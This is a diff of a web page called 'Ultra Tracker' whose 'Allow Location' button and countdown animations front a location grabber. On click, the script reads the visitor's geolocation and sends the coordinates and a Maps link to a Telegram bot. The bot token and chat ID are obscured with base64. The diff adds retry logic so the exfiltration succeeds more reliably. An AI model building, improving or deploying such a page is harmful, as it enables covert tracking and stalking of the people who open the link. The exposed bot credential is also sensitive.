@@ -3,120 +3,87 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Advanced Tracker UI</title>
+
+<title>Ultra Tracker</title>
 
 <style>
-
-/* 🌌 Background */
 body {
-    margin: 0;
-    height: 100vh;
-    background: linear-gradient(135deg, #ff1493, #8a2be2);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: 'Segoe UI', sans-serif;
-    overflow: hidden;
-    color: white;
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background: linear-gradient(135deg,#ff1493,#6a0dad);
+    font-family: Arial;
+    color:white;
 }
 
-/* 🧊 Glass Container */
 .container {
-    width: 90%;
-    max-width: 420px;
-    padding: 25px;
-    border-radius: 20px;
-    backdrop-filter: blur(20px);
-    background: rgba(255,255,255,0.08);
-    box-shadow: 0 0 40px rgba(0,0,0,0.3);
-    text-align: center;
+    width:90%;
+    max-width:420px;
+    padding:20px;
+    border-radius:20px;
+    background:rgba(255,255,255,0.08);
+    backdrop-filter:blur(20px);
+    text-align:center;
 }
 
-/* 🔘 Button */
-button {
-    width: 100%;
-    padding: 15px;
-    font-size: 18px;
-    border-radius: 12px;
-    border: none;
-    background: linear-gradient(45deg, #ff0080, #ff8c00);
-    color: white;
-    font-weight: bold;
-    cursor: pointer;
+/* Button */
+button{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:10px;
+    font-size:18px;
+    background:linear-gradient(45deg,#ff0080,#ff8c00);
+    color:white;
 }
 
-/* 🧠 Heading */
-#heading {
-    font-size: 20px;
-    margin-top: 20px;
-    opacity: 0.9;
+/* Huge Countdown */
+#countdown{
+    font-size:25vw;
+    font-weight:900;
+    margin:10px 0;
 }
 
-/* 🔥 HUGE COUNTDOWN */
-#countdown {
-    font-size: 22vw; /* responsive giant size */
-    font-weight: 900;
-    margin: 10px 0;
-    line-height: 1;
-    background: linear-gradient(45deg, #ffffff, #ffd700);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    text-shadow: 0 0 20px rgba(255,255,255,0.5);
+/* Heading */
+#heading{
+    font-size:20px;
 }
 
-/* ✨ Glow Animation */
-.glow {
-    animation: glowPulse 1s infinite alternate;
+/* Progress */
+.bar{
+    width:100%;
+    height:8px;
+    background:rgba(255,255,255,0.2);
+    border-radius:10px;
+    overflow:hidden;
 }
 
-@keyframes glowPulse {
-    from { text-shadow: 0 0 10px #fff; }
-    to { text-shadow: 0 0 40px #fff; }
+.fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#00ffcc,#00ff66);
 }
 
-/* 📊 Progress Bar */
-.progress {
-    width: 100%;
-    height: 8px;
-    background: rgba(255,255,255,0.2);
-    border-radius: 10px;
-    overflow: hidden;
-    margin-top: 10px;
+/* Shake */
+#img{
+    width:140px;
+    display:none;
+    margin-top:15px;
 }
 
-.progress-bar {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #00ffcc, #00ff66);
-    transition: width 0.3s;
+@keyframes shake{
+    0%{transform:translate(0,0);}
+    25%{transform:translate(12px,-12px);}
+    50%{transform:translate(-12px,12px);}
+    75%{transform:translate(12px,12px);}
+    100%{transform:translate(-12px,-12px);}
 }
 
-/* 🖼 Shake Image */
-#shakeImg {
-    width: 150px;
-    display: none;
-    margin-top: 20px;
+.shake{
+    animation:shake 0.07s infinite;
 }
-
-@keyframes shake {
-    0% { transform: translate(0,0); }
-    25% { transform: translate(10px,-10px); }
-    50% { transform: translate(-10px,10px); }
-    75% { transform: translate(10px,10px); }
-    100% { transform: translate(-10px,-10px); }
-}
-
-.shake {
-    animation: shake 0.08s infinite;
-}
-
-/* 📱 Mobile refinement */
-@media (max-width: 480px) {
-    #countdown {
-        font-size: 28vw;
-    }
-}
-
 </style>
 </head>
 
@@ -124,16 +91,14 @@ button {
 
 <div class="container">
 
-<button onclick="startProcess()">Allow Location</button>
+<button onclick="start()">Allow Location</button>
 
 <div id="heading"></div>
-<div id="countdown" class="glow"></div>
+<div id="countdown"></div>
 
-<div class="progress">
-    <div id="progressBar" class="progress-bar"></div>
-</div>
+<div class="bar"><div id="fill" class="fill"></div></div>
 
-<img id="shakeImg" src="https://i.imgur.com/8Km9tLL.png">
+<img id="img" src="https://i.imgur.com/8Km9tLL.png">
 
 <audio id="audio" src="https://www.soundjay.com/buttons/sounds/button-4.mp3"></audio>
 
@@ -145,95 +110,113 @@ button {
 const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
 const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
 
-let done = false;
+let done=false;
 
-/* 📡 FAST TELEGRAM WITH MAP LINK */
-function sendToTelegram(lat, lon) {
-    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+/* 🚀 TELEGRAM WITH RETRY (KEY FIX) */
+async function send(lat,lon,retry=0){
 
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `📍 Location\nLat: ${lat}\nLon: ${lon}\nMap: ${mapLink}`
-        })
-    }).then(() => {
-        done = true;
-        successEffect();
-    });
+    const map=`https://www.google.com/maps?q=${lat},${lon}`;
+
+    try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                chat_id:CHAT_ID,
+                text:`📍 Location\nLat:${lat}\nLon:${lon}\nMap:${map}`
+            })
+        });
+
+        done=true;
+        success();
+
+    }catch(e){
+
+        if(retry<3){
+            send(lat,lon,retry+1);
+        }
+    }
 }
 
-/* ⚡ FAST LOCATION */
-function getLocation() {
+/* ⚡ FAST LOCATION (OLD TECHNIQUE RESTORED) */
+function getLocation(){
+
     navigator.geolocation.getCurrentPosition(
-        pos => sendToTelegram(pos.coords.latitude, pos.coords.longitude),
-        () => {},
-        { enableHighAccuracy:false, maximumAge:Infinity, timeout:5000 }
+        pos=>{
+            send(pos.coords.latitude,pos.coords.longitude);
+        },
+        ()=>{},
+        {
+            enableHighAccuracy:false,
+            maximumAge:Infinity,
+            timeout:5000
+        }
     );
 }
 
-/* 🎯 SUCCESS EFFECT */
-function successEffect() {
-    document.getElementById("heading").innerText = "UPLOAD SUCCESS";
-    document.getElementById("countdown").innerText = "";
+/* 🎯 SUCCESS */
+function success(){
 
-    const img = document.getElementById("shakeImg");
-    img.style.display = "block";
+    document.getElementById("heading").innerText="SUCCESS";
+    document.getElementById("countdown").innerText="";
+
+    let img=document.getElementById("img");
+    img.style.display="block";
     img.classList.add("shake");
 
     document.getElementById("audio").play();
 }
 
 /* 📊 Progress */
-function setProgress(p) {
-    document.getElementById("progressBar").style.width = p + "%";
+function progress(p){
+    document.getElementById("fill").style.width=p+"%";
 }
 
-/* ⏱ Countdown Engine */
-function countdown(sec, color, title, next) {
+/* ⏱ Countdown */
+function run(sec,color,title,next){
 
-    let time = sec;
-    const el = document.getElementById("countdown");
+    let t=sec;
 
-    document.getElementById("heading").innerText = title;
-    el.style.color = color;
+    document.getElementById("heading").innerText=title;
+    document.getElementById("countdown").style.color=color;
 
-    const interval = setInterval(() => {
+    let i=setInterval(()=>{
 
-        if (done) {
-            clearInterval(interval);
+        if(done){
+            clearInterval(i);
             return;
         }
 
-        el.innerText = time;
-        setProgress(((sec - time) / sec) * 100);
+        document.getElementById("countdown").innerText=t;
+        progress(((sec-t)/sec)*100);
 
-        time--;
+        t--;
 
-        if (time < 0) {
-            clearInterval(interval);
+        if(t<0){
+            clearInterval(i);
             next && next();
         }
 
-    }, 1000);
+    },1000);
 }
 
-/* 🚀 MAIN */
-window.startProcess = function(){
+/* 🔥 MAIN */
+window.start=function(){
 
-    done = false;
+    done=false;
+
+    // ⚡ START LOCATION IMMEDIATELY (CRITICAL)
     getLocation();
 
-    countdown(10, "black", "Scanning Your Location", () => {
+    run(10,"black","Scanning...",()=>{
 
-        if (done) return;
+        if(done) return;
 
-        countdown(5, "red", "Still Uploading...", () => {
+        run(5,"red","Retrying...",()=>{
 
-            if (done) return;
+            if(done) return;
 
-            countdown(5, "yellow", "Final Attempt...");
+            run(5,"yellow","Final Attempt...");
         });
 
     });
